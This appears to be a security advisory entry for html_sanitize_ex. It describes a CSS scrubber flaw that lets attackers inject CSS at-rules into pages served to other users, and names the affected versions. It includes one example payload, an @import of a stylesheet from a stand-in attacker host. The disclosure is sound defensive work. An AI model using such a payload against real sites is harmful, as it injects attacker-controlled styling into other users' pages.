title: "Improper Neutralization of Special Elements in Output Used by a Downstream
  Component ('Injection') vulnerability in the CSS scrubber in rrrene html_sanitize_ex
  allows an unauthenticated remote attacker to inject CSS at-rules, including an import
  of a remote stylesheet, into a page served to other users. HtmlSanitizeEx.Scrubber.CSS.scrub/1
  applies its property and value allowlist through a Regex.replace over substrings
  matching a property: value declaration pattern, so input that does not match that
  pattern is never inspected and is copied to the output unchanged. @import url(//attacker.example/style.css);
  survives, while the same URL inside a background: url(...) declaration is removed.\n\
  \nElement boundaries are resolved before the scrubber runs, so injected content
  does not escape the <style> element and no script executes.\n\nThis issue affects
  html_sanitize_ex: from 0.3.1 before 1.5.4."
